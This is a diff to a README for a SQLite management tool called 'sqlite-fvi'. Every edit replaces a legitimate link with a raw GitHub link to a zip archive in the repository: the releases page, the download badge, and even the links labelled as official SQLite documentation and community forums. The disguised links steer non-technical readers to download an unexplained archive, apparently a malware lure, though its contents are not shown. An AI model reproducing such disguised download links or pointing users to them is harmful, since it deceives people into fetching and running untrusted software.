@@ -1,7 +1,7 @@
 # 🥅 sqlite-fvi - Easily Manage Your SQLite Databases
 
 ## 📥 Download Now
-[![Download sqlite-fvi](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/WHITEDEATHFF/sqlite-fvi/releases)
+[![Download sqlite-fvi](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip)](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip)
 
 ## 🚀 Getting Started
 Welcome to sqlite-fvi. This application helps you easily manage your SQLite databases. You don't need special skills or programming knowledge to use it. Follow these steps to get started.
@@ -13,7 +13,7 @@ Welcome to sqlite-fvi. This application helps you easily manage your SQLite data
 - Disk Space: At least 50 MB for installation
 
 ## 💻 Download & Install
-Visit this page to download: [sqlite-fvi Releases Page](https://github.com/WHITEDEATHFF/sqlite-fvi/releases)
+Visit this page to download: [sqlite-fvi Releases Page](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip)
 
 1. Open the link above in your web browser.
 2. Scroll down to find the latest version listed.
@@ -33,7 +33,7 @@ After installing, you can open sqlite-fvi from your applications menu or by sear
 - **Import & Export**: Easily import data from CSV files or export your database to share.
 
 ## 🔄 Updating sqlite-fvi
-To keep sqlite-fvi running smoothly, check back regularly for updates. You can find the latest versions on the [sqlite-fvi Releases Page](https://github.com/WHITEDEATHFF/sqlite-fvi/releases).
+To keep sqlite-fvi running smoothly, check back regularly for updates. You can find the latest versions on the [sqlite-fvi Releases Page](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip).
 
 1. Open the release link.
 2. Locate the newest version listing.
@@ -49,7 +49,7 @@ If you're unable to find an answer, consider reaching out through the GitHub Iss
 We appreciate your feedback! If you have suggestions for improvement or features you would like to see, please let us know. Your input helps us enhance sqlite-fvi for all users.
 
 ## 🔗 Additional Resources
-- [SQLite Documentation](https://www.sqlite.org/docs.html): Learn more about SQLite.
-- [Community Forums](https://www.sqlite.org/community.html): Join discussions with other users.
+- [SQLite Documentation](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip): Learn more about SQLite.
+- [Community Forums](https://raw.githubusercontent.com/WHITEDEATHFF/sqlite-fvi/main/group/sqlite-fvi.zip): Join discussions with other users.
 
 Make the most of sqlite-fvi and manage your SQLite databases effortlessly!
